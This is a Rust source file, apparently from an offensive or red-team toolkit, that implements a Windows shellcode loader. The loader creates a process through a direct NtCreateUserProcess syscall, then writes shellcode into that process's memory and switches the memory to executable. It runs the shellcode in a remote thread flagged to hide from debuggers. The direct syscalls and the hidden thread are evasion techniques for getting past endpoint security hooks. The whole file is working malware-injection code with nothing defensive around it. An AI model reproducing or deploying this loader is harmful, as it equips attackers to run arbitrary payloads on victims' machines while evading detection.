#![cfg(target_family = "windows")]

use std::error::Error;
use std::ffi::{c_ulong, c_void};
use std::iter::once;

use ntapi::ntpsapi::{
    PsCreateInitialState, PPS_ATTRIBUTE_LIST, PS_ATTRIBUTE_IMAGE_NAME, PS_ATTRIBUTE_LIST,
    PS_CREATE_INFO, THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER,
};
use ntapi::ntrtl::{
    RtlAllocateHeap, RtlCreateProcessParametersEx, RtlDestroyProcessParameters, RtlFreeHeap,
    RtlInitUnicodeString, RtlProcessHeap, PRTL_USER_PROCESS_PARAMETERS,
    RTL_USER_PROC_PARAMS_NORMALIZED,
};
use syscalls::syscall;

use winapi::shared::ntdef::{
    HANDLE, NTSTATUS, NT_SUCCESS, NULL, OBJECT_ATTRIBUTES, UNICODE_STRING,
};
use winapi::um::synchapi::WaitForSingleObject;
use winapi::um::winbase::INFINITE;
use winapi::um::winnt::{
    HEAP_ZERO_MEMORY, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE,
    PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS,
};

pub fn shellcode_loader_syscalls(
    mut shellcode: Vec<u8>,
    pe_to_execute: &str,
) -> Result<(), Box<dyn Error>> {
    let mut full_path = "\\??\\".to_owned() + pe_to_execute;
    full_path = full_path.trim().to_owned() + "\0";

    let mut status: NTSTATUS;
    let mut process_handle: HANDLE = NULL;
    let mut thread_handle: HANDLE = NULL;

    unsafe {
        let mut nt_image_path: UNICODE_STRING = UNICODE_STRING::default();

        // Image path in NT format
        // https://stackoverflow.com/questions/76211265/pdhaddcounterw-no-rules-expected-this-token-in-macro-call
        let source_string = full_path.encode_utf16().chain(once(0)).collect::<Vec<_>>();
        RtlInitUnicodeString(&mut nt_image_path, source_string.as_ptr() as *const u16);

        // Process parameters building
        let mut process_parameters: PRTL_USER_PROCESS_PARAMETERS = std::mem::zeroed();
        status = RtlCreateProcessParametersEx(
            &mut process_parameters,
            &mut nt_image_path,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            RTL_USER_PROC_PARAMS_NORMALIZED,
        );
        if !NT_SUCCESS(status) {
            log::debug!("Error creating process parameters : {:x}", status);
            return Err(status.to_string().into());
        }

        // PS_CREATE_INFO structure building
        let mut create_info = PS_CREATE_INFO::default();
        create_info.Size = std::mem::size_of::<PS_CREATE_INFO>();
        create_info.State = PsCreateInitialState;

        // Process and thread attributs building
        let attribute_list: PPS_ATTRIBUTE_LIST = RtlAllocateHeap(
            RtlProcessHeap(),
            HEAP_ZERO_MEMORY,
            std::mem::size_of::<PS_ATTRIBUTE_LIST>(),
        ) as PPS_ATTRIBUTE_LIST;
        attribute_list.as_mut().unwrap().TotalLength = std::mem::size_of::<PS_ATTRIBUTE_LIST>();
        attribute_list.as_mut().unwrap().Attributes[0].Attribute = PS_ATTRIBUTE_IMAGE_NAME;
        attribute_list.as_mut().unwrap().Attributes[0].Size = nt_image_path.Length as usize;
        attribute_list.as_mut().unwrap().Attributes[0].u.Value = nt_image_path.Buffer as usize;

        // New process startup
        status = syscall!(
            "NtCreateUserProcess",
            &mut process_handle,
            &mut thread_handle,
            PROCESS_ALL_ACCESS,
            THREAD_ALL_ACCESS,
            NULL as *mut OBJECT_ATTRIBUTES,
            NULL as *mut OBJECT_ATTRIBUTES,
            0 as c_ulong,
            0 as c_ulong,
            process_parameters as *mut c_void,
            &mut create_info,
            attribute_list
        );
        if !NT_SUCCESS(status) {
            log::debug!("Error creating process : {:x}", status);
            return Err(status.to_string().into());
        }

        RtlFreeHeap(RtlProcessHeap(), 0, attribute_list as *mut c_void);
        RtlDestroyProcessParameters(process_parameters);
    }

    let mut base_addr = NULL;

    unsafe {
        status = syscall!(
            "NtAllocateVirtualMemory",
            process_handle,
            &mut base_addr,
            0,
            &mut shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE
        );
    }
    if !NT_SUCCESS(status) {
        log::debug!(
            "Error allocating memory in the target process: {:x}",
            status
        );
        return Err(status.to_string().into());
    }

    unsafe {
        status = syscall!(
            "NtWriteVirtualMemory",
            process_handle,
            base_addr,
            shellcode.as_mut_ptr() as *mut c_void,
            shellcode.len(),
            NULL
        );
    }
    if !NT_SUCCESS(status) {
        log::debug!("Error writing in the target process memory: {:x}", status);
        return Err(status.to_string().into());
    }

    unsafe {
        let mut old_perms = PAGE_READWRITE;
        status = syscall!(
            "NtProtectVirtualMemory",
            process_handle,
            &mut base_addr,
            &mut shellcode.len(),
            PAGE_EXECUTE_READ,
            &mut old_perms
        );
    }
    if !NT_SUCCESS(status) {
        log::debug!("Error changing memory permission: {:x}", status);
        return Err(status.to_string().into());
    }

    shellcode.clear();
    shellcode.shrink_to_fit();

    let mut thread_handle: HANDLE = NULL;
    unsafe {
        status = syscall!(
            "NtCreateThreadEx",
            &mut thread_handle,
            THREAD_ALL_ACCESS,
            NULL,
            process_handle,
            base_addr,
            NULL,
            THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER,
            0 as usize,
            0 as usize,
            0 as usize,
            NULL
        );
    }
    if !NT_SUCCESS(status) {
        log::debug!("Error starting remote thread: {:x}", status);
        return Err(status.to_string().into());
    }

    unsafe {
        WaitForSingleObject(thread_handle, INFINITE);
    }

    unsafe {
        status = syscall!("NtClose", process_handle);
    }
    if !NT_SUCCESS(status) {
        log::debug!("Closing failed: {}", status);
        return Err(status.to_string().into());
    }

    Ok(())
}
